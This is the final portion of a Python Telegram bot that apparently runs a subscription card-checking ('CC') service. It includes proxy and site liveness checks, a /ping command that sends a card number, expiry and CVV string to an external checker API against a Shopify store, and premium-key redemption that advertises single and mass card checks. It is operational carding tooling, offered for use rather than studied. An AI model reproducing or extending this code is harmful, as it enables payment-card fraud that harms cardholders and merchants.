    try:
        for i in range(0, len(proxies), bs):
            batch = proxies[i:i+bs]
            tasks = [test_proxy(p) for p in batch]
            results = await asyncio.gather(*tasks)
            for r in results:
                (alive if r['status'] == 'alive' else dead).append(r['proxy'])
            await sm.edit(premium_emoji(f"🔥 Checking proxies...\n\n<b>Checked:</b> {len(alive)+len(dead)}/{len(proxies)}\n<b>Alive:</b> {len(alive)}\n<b>Dead:</b> {len(dead)}"), parse_mode='html')
        with open(PROXY_FILE, 'w') as f:
            f.write('\n'.join(alive))
        await sm.edit(premium_emoji(f"✅ <b>Proxy Check Complete!</b>\n\n<b>Total:</b> {len(proxies)}\n<b>Alive:</b> {len(alive)}\n<b>Removed:</b> {len(dead)}\n\n<code>proxy.txt</code> updated with working proxies."), parse_mode='html')
    except Exception as e:
        await sm.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ========== SITE CHECK /siteran ==========
@bot.on(events.NewMessage(pattern='/siteran'))
async def siteran(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(premium_emoji("<b>⚡ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱!</b>"), parse_mode='html'); return
    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ sites.txt is empty."), parse_mode='html'); return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies."), parse_mode='html'); return
    sm = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."), parse_mode="html")
    alive_s, dead_s = [], []
    bs = 10
    try:
        for i in range(0, len(sites), bs):
            batch = sites[i:i+bs]
            fp = load_proxies() or proxies
            tasks = [test_site(s, random.choice(fp)) for s in batch]
            results = await asyncio.gather(*tasks)
            for r in results:
                (alive_s if r['status'] == 'alive' else dead_s).append(r['site'])
            await sm.edit(premium_emoji(f"🔥 Checking sites...\n\n<b>Checked:</b> {len(alive_s)+len(dead_s)}/{len(sites)}\n<b>Alive:</b> {len(alive_s)}\n<b>Dead:</b> {len(dead_s)}"), parse_mode='html')
        with open(SITES_FILE, 'w') as f:
            f.write('\n'.join(alive_s))
        await sm.edit(premium_emoji(f"✅ <b>Site Check Complete!</b>\n\n<b>Total:</b> {len(sites)}\n<b>Alive:</b> {len(alive_s)}\n<b>Removed:</b> {len(dead_s)}\n\n<code>sites.txt</code> updated."), parse_mode='html')
    except Exception as e:
        await sm.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ========== PAUSE/RESUME/STOP ==========
@bot.on(events.CallbackQuery(data=b"pause"))
async def pause_handler(event):
    uid = event.sender_id; mid = event.message_id
    sk = f"{uid}_{mid}"; active_sessions[sk] = {'paused': True}
    await event.answer(premium_emoji("⏸️ Paused"))

@bot.on(events.CallbackQuery(data=b"resume"))
async def resume_handler(event):
    uid = event.sender_id; mid = event.message_id
    sk = f"{uid}_{mid}"; active_sessions[sk] = {'paused': False}
    await event.answer(premium_emoji("▶️ Resumed"))

@bot.on(events.CallbackQuery(data=b"stop"))
async def stop_handler(event):
    uid = event.sender_id; mid = event.message_id
    sk = f"{uid}_{mid}"
    if sk in active_sessions:
        del active_sessions[sk]
    await event.answer(premium_emoji("🛑 Stopped"))
    await event.edit(premium_emoji("😡 **Checking stopped by user.**"), parse_mode="html")

# ========== ADMIN COMMANDS ==========
@bot.on(events.NewMessage(pattern='/ping'))
async def ping(event):
    uid = event.sender_id
    if not is_premium(uid):
        await send_force_join(event)
        return
    msg = await event.reply(premium_emoji("🔄 Pinging API..."))
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(f"{CHECKER_API_URL}/?5154623245618097|03|2032|156&url=https://fxdesigns-8213.myshopify.com") as resp:
                raw = await resp.json(content_type=None)
        await msg.edit(premium_emoji(f"✅ <b>API is ALIVE!</b>\n\n<blockquote>Response: {raw.get('Response','?')}</blockquote>\n<blockquote>💰 Price: {raw.get('Price','?')}</blockquote>\n<blockquote>⚡ Speed: {raw.get('Time','?')}</blockquote>"), parse_mode='html')
    except Exception as e:
        await msg.edit(premium_emoji(f"❌ API DOWN: {e}"))

@bot.on(events.NewMessage(pattern='/restart'))
async def restart(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("⚡ Admin only!"), parse_mode='html'); return
    await event.reply(premium_emoji("🔄 Restarting bot..."), parse_mode="html")
    os.execl(sys.executable, sys.executable, *sys.argv)

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem(event):
    uid = event.sender_id
    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("⚡ <b>Usage:</b> <code>/redeem nschk-xxxxxxxxxxxxxxx</code>"), parse_mode='html'); return
        key = args[1].strip()
        if not key.startswith('nschk-'):
            await event.reply(premium_emoji("⚡ <b>Invalid Key Format!</b>\n\nUse: <code>/redeem nschk-xxxxxxxxxxxxxxx</code>"), parse_mode='html'); return
        ok, msg = redeem_key(key, uid)
        if ok:
            await event.reply(premium_emoji(
                f"""<b>⚡ Key Redeemed Successfully! ⚡</b>

<b>⚡ Thanks for your purchase!
⚡ Plan: 1 Days</b>

<b>⚡ You now have access to:
⚡ /sh — Check CC
⚡ /msh — Mass Check</b>

<b>⚡ Enjoy your premium experience!</b>"""), parse_mode='html')
        else:
            await event.reply(premium_emoji(f"<b>⚡ Redemption Failed!</b>\n\n⚡ {msg}"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/genkey'))
async def genkey(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("⚡ <b>Admin only command!</b>"), parse_mode='html'); return
    try:
        args = event.message.text.split(' ')
        count, days = 1, 0
        if len(args) > 1:
            try: count = int(args[1])
            except: count = 1
            if count > 50: count = 50
        if len(args) > 2:
            try: days = int(args[2])
            except: days = 0
        keys = [generate_key() for _ in range(count)]
        for k in keys: save_key(k)
        plan = f"{days} Days" if days > 0 else "Lifetime"
        key_lines = "\n".join([f"┣ <code>{k}</code>" if i < count-1 else f"┗ <code>{k}</code>" for i, k in enumerate(keys)])
        msg = f"""<b>𝙆𝙚𝙮𝙨 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙 ✅</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
┣ 𝗖𝗼𝘂𝗻𝘁 ➜ {count}
┣ 𝗣𝗹𝗮𝗻 ➜ {plan}
┣ 𝗞𝗲𝘆𝘀 ✅
{key_lines}

<b>𝗨𝘀𝗲𝗿𝘀 𝗿𝗲𝗱𝗲𝗲𝗺 𝘄𝗶𝘁𝗵 /redeem [key] ⚡</b>"""
        await event.reply(premium_emoji(msg), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addadmin'))
async def addadmin(event):
    if not is_owner(event.sender_id):
        await event.reply(premium_emoji("⚡ <b>Owner only command!</b>"), parse_mode='html'); return
    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("⚡ Usage: <code>/addadmin USER_ID</code>"), parse_mode='html'); return
        new_id = int(args[1].strip())
        if new_id not in ADMIN_IDS:
            ADMIN_IDS.append(new_id)
            await event.reply(premium_emoji(f"✅ <b>Admin added:</b> <code>{new_id}</code>"), parse_mode='html')
        else:
            await event.reply(premium_emoji("❌ User is already admin."), parse_mode='html')
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid user ID."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/adminlist'))
async def adminlist(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("⚡ <b>Admin only command!</b>"), parse_mode='html'); return
    al = "\n".join([f"┣ 👑 <code>{aid}</code> — <b>Owner</b>" if aid == OWNER_ID else f"┣ ⚡ <code>{aid}</code> — <b>Admin</b>" for aid in ADMIN_IDS])
    msg = f"""<b>⚡ Admin Panel ⚡</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>👑 Admins</b>
{al}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>"""
    await event.reply(premium_emoji(msg), parse_mode='html')

@bot.on(events.NewMessage(pattern='/gclist'))
async def gclist(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("⚡ <b>Admin only!</b>"), parse_mode='html'); return
    groups = load_groups()
    gl = "\n".join([f"┣ 🌐 <code>{g}</code>" for g in groups]) if groups else "┣ ❌ No groups approved"
    msg = f"""<b>🌐 Allowed Groups 🌐</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
{gl}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>"""
    await event.reply(premium_emoji(msg), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addgc'))
async def addgc(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("⚡ <b>Admin only!</b>"), parse_mode='html'); return
    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("⚡ <b>Usage:</b> <code>/addgc GROUP_ID</code>"), parse_mode='html'); return
        gid = args[1].strip()
        if add_group(gid):
            await event.reply(premium_emoji(f"✅ <b>Group approved!</b>\n\n<code>{gid}</code> added to allowed groups."), parse_mode='html')
        else:
            await event.reply(premium_emoji("❌ Group already in allowed list."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ========== START ==========
print("✅ Bot started successfully!")
bot.run_until_disconnected()
